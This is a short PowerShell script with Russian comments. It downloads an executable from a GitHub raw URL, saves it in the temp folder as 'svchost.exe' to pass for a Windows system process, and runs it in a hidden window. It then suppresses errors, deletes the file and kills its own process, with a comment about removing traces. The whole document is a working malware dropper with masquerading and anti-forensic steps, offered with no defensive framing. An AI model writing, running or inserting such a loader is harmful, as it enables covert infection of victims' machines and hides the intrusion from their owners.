$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\svchost.exe"

# Принудительно включаем поддержку TLS 1.2 для соединения с GitHub
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    # Используем WebClient, он быстрее и менее капризен к настройкам системы, чем Invoke-WebRequest
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $exePath)
    
    # Проверяем, существует ли файл перед запуском
    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
} catch {
    # Игнорируем ошибки
}

# Удаляем следы запуска из истории и закрываем процесс
Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $PID -Force
